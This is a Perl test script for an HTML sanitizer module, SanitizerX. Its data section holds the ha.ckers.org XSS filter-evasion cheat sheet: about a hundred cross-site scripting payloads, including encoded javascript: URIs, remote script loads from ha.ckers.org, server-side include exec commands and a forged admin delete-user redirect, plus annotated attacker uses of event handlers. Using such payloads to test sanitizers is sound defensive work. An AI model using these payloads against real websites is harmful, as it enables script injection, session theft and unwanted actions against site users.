#!/usr/bin/env perl
use warnings;
use strict;
use Test::More;

BEGIN { use_ok("SanitizerX") }

ok( defined &sanitize_html, "sanitize_html is exported" );

local $/ = "\n_RS_\n";
while ( my $in = <DATA> )
{
    chomp $in;
    my $out = sanitize_html(\$in);
    next if $out !~ /</;
    diag(sprintf("BEFORE: $in\n----------\nAFTER: $out\n",
                 $in,
                 $out)
        );
    diag "================================\n";
}

done_testing();

exit 0;

__DATA__
Downloaded from ha.ckers.org 20220315. Beware! What's the matter? Don't you get it?
_RS_
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
_RS_
'';!--"<XSS>=&{()}
_RS_
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
_RS_
<IMG SRC="javascript:alert('XSS');">
_RS_
<IMG SRC=javascript:alert('XSS')>
_RS_
<IMG SRC=JaVaScRiPt:alert('XSS')>
_RS_
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
_RS_
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
_RS_
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
_RS_
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
_RS_
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
_RS_
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
_RS_
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
_RS_
<IMG SRC="jav	ascript:alert('XSS');">
_RS_
<IMG SRC="jav&#x09;ascript:alert('XSS');">
_RS_
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
_RS_
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
_RS_
<IMGSRC="javascript:alert('XSS')">
_RS_
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
_RS_
perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
_RS_
<IMG SRC=" &#14;  javascript:alert('XSS');">
_RS_
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
_RS_
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<<SCRIPT>alert("XSS");//<</SCRIPT>
_RS_
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
_RS_
<SCRIPT SRC=//ha.ckers.org/.j>
_RS_
<IMG SRC="javascript:alert('XSS')"
_RS_
<iframe src=http://ha.ckers.org/scriptlet.html <
_RS_
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
_RS_
\";alert('XSS');//
_RS_
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
_RS_
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
_RS_
<BODY BACKGROUND="javascript:alert('XSS')">
_RS_
<BODY ONLOAD=alert('XSS')>
_RS_

1.	FSCommand() (attacker can use this when executed from within an embedded Flash object)
2.	onAbort() (when user aborts the loading of an image)
3.	onActivate() (when object is set as the active element)
4.	onAfterPrint() (activates after user prints or previews print job)
5.	onAfterUpdate() (activates on data object after updating data in the source object)
6.	onBeforeActivate() (fires before the object is set as the active element)
7.	onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand("Copy") function)
8.	onBeforeCut() (attacker executes the attack string right before a selection is cut)
9.	onBeforeDeactivate() (fires right after the activeElement is changed from the current object)
10.	onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
11.	onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand("Paste") function)
12.	onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand("Print") function).
13.	onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
14.	onBegin() (the onbegin event fires immediately when the element's timeline begins)
15.	onBlur() (in the case where another popup is loaded and window looses focus)
16.	onBounce() (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
17.	onCellChange() (fires when data changes in the data provider)
18.	onChange() (select, text, or TEXTAREA field loses focus and its value has been modified)
19.	onClick() (someone clicks on a form)
20.	onContextMenu() (user would need to right click on attack area)
21.	onControlSelect() (fires when the user is about to make a control selection of the object)
22.	onCopy() (user needs to copy something or it can be exploited using the execCommand("Copy") command)
23.	onCut() (user needs to copy something or it can be exploited using the execCommand("Cut") command)
24.	onDataAvailable() (user would need to change data in an element, or attacker could perform the same function)
25.	onDataSetChanged() (fires when the data set exposed by a data source object changes)
26.	onDataSetComplete() (fires to indicate that all data is available from the data source object)
27.	onDblClick() (user double-clicks a form element or a link)
28.	onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document)
29.	onDrag() (requires that the user drags an object)
30.	onDragEnd() (requires that the user drags an object)
31.	onDragLeave() (requires that the user drags an object off a valid location)
32.	onDragEnter() (requires that the user drags an object into a valid location)
33.	onDragOver() (requires that the user drags an object into a valid location)
34.	onDragDrop() (user drops an object (e.g. file) onto the browser window)
35.	onDrop() (user drops an object (e.g. file) onto the browser window)
36.	onEnd() (the onEnd event fires when the timeline ends.  This can be exploited, like most of the HTML+TIME event handlers by doing something like <P STYLE="behavior:url('#default#time2')" onEnd="alert('XSS')">)
37.	onError() (loading of a document or image causes an error)
38.	onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)
39.	onFilterChange() (fires when a visual filter completes state change)
40.	onFinish() (attacker can create the exploit when marquee is finished looping)
41.	onFocus() (attacker executes the attack string when the window gets focus)
42.	onFocusIn() (attacker executes the attack string when window gets focus)
43.	onFocusOut() (attacker executes the attack string when window looses focus)
44.	onHelp() (attacker executes the attack string when users hits F1 while the window is in focus)
45.	onKeyDown() (user depresses a key)
46.	onKeyPress() (user presses or holds down a key)
47.	onKeyUp() (user releases a key)
48.	onLayoutComplete() (user would have to print or print preview)
49.	onLoad() (attacker executes the attack string after the window loads)
50.	onLoseCapture() (can be exploited by the releaseCapture() method)
51.	onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing)
52.	onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
53.	onMouseDown() (the attacker would need to get the user to click on an image)
54.	onMouseEnter() (cursor moves over an object or area)
55.	onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again)
56.	onMouseMove() (the attacker would need to get the user to mouse over an image or table)
57.	onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again)
58.	onMouseOver() (cursor moves over an object or area)
59.	onMouseUp() (the attacker would need to get the user to click on an image)
60.	onMouseWheel() (the attacker would need to get the user to use their mouse wheel)
61.	onMove() (user or attacker would move the page)
62.	onMoveEnd() (user or attacker would move the page)
63.	onMoveStart() (user or attacker would move the page)
64.	onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline)
65.	onPaste() (user would need to paste or attacker could use the execCommand("Paste") function)
66.	onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element)
67.	onProgress() (attacker would use this as a flash movie was loading)
68.	onPropertyChange() (user or attacker would need to change an element property)
69.	onReadyStateChange() (user or attacker would need to change an element property)
70.	onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle)
71.	onReset() (user or attacker resets a form)
72.	onResize() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
73.	onResizeEnd() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
74.	onResizeStart() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
75.	onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
76.	onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
77.	onRowsEnter() (user or attacker would need to change a row in a data source)
78.	onRowExit() (user or attacker would need to change a row in a data source)
79.	onRowDelete() (user or attacker would need to delete a row in a data source)
80.	onRowInserted() (user or attacker would need to insert a row in a data source)
81.	onScroll() (user would need to scroll, or attacker could use the scrollBy() function)
82.	onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward)
83.	onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
84.	onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
85.	onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
86.	onStart() (fires at the beginning of each marquee loop)
87.	onStop() (user would need to press the stop button or leave the webpage)
88.	onSyncRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire)
89.	onSubmit() (requires attacker or user submits a form)
90.	onTimeError() (user or attacker sets a time property, such as dur, to an invalid value)
91.	onTrackChange() (user or attacker changes track in a playList)
92.	onUnload() (as the user clicks any link or presses the back button or attacker forces a click)
93.	onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
94.	seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)

_RS_
<IMG DYNSRC="javascript:alert('XSS')">
_RS_
<IMG LOWSRC="javascript:alert('XSS')">
_RS_
<BGSOUND SRC="javascript:alert('XSS');">
_RS_
<BR SIZE="&{alert('XSS')}">
_RS_
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
_RS_
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
_RS_
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
_RS_
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
_RS_
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
_RS_
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
_RS_
<XSS STYLE="behavior: url(xss.htc);">
_RS_
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
_RS_
<IMG SRC='vbscript:msgbox("XSS")'>
_RS_
<IMG SRC="mocha:[code]">
_RS_
<IMG SRC="livescript:[code]">
_RS_
¼script¾alert(¢XSS¢)¼/script¾
_RS_
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
_RS_
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
_RS_
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
_RS_
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
_RS_
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
_RS_
<TABLE BACKGROUND="javascript:alert('XSS')">
_RS_
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
_RS_
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
_RS_
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
_RS_
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
_RS_
<DIV STYLE="width: expression(alert('XSS'));">
_RS_
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
_RS_
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
_RS_
<XSS STYLE="xss:expression(alert('XSS'))">
_RS_
exp/*<A STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
_RS_
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
_RS_
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
_RS_
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
_RS_
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
_RS_
<BASE HREF="javascript:alert('XSS');//">
_RS_
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
_RS_
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
_RS_
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
_RS_
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
_RS_
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);
_RS_
<HTML xmlns:xss>
  <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
  <xss:xss>XSS</xss:xss>
</HTML>
_RS_
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
_RS_
<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
_RS_
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
_RS_
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
</BODY></HTML>
_RS_
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
_RS_
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
_RS_
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
_RS_
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
_RS_
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
_RS_
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
_RS_
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
_RS_
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
_RS_
<A HREF="http://66.102.7.147/">XSS</A>
_RS_
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
_RS_
<A HREF="http://1113982867/">XSS</A>
_RS_
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
_RS_
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
_RS_
<A HREF="h
tt	p://6&#9;6.000146.0x7.147/">XSS</A>
_RS_
<A HREF="//www.google.com/">XSS</A>
_RS_
<A HREF="//google">XSS</A>
_RS_
<A HREF="http://ha.ckers.org@google">XSS</A>
_RS_
<A HREF="http://google:ha.ckers.org">XSS</A>
_RS_
<A HREF="http://google.com/">XSS</A>
_RS_
<A HREF="http://www.google.com./">XSS</A>
_RS_
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
_RS_
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
_RS_
<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
